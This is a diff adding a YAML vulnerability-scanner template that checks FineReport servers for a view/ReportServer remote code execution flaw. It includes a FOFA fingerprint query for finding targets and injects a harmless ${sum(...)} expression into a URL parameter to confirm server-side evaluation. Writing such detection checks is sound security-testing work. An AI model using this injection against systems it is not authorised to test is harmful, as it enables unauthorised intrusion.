@@ -1,0 +1,32 @@
+id: poc-yaml-finereport-view-reportserver-rce
+info:
+  name: 帆软报表 view/ReportServer 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: finereport
+  fofa: Powered by 帆软
+variables:
+  t1: random_int(1000,10000)
+  t2: random_int(100,1000)
+  t3: t1 + t2
+  path: 'webroot/decision
+
+    decision
+
+    bi/decision
+
+    BI/decision
+
+    '
+requests:
+- method: GET
+  path: /{{.path}}/view/ReportServer?test=&n=${sum({{.t1}},{{.t2}})}
+  expression: 'status_code == 302 &&
+
+    contains(headers,`/webroot/decision/view/report?test=&n=`+t3) &&
+
+    body == ""
+
+    '
+transport: http
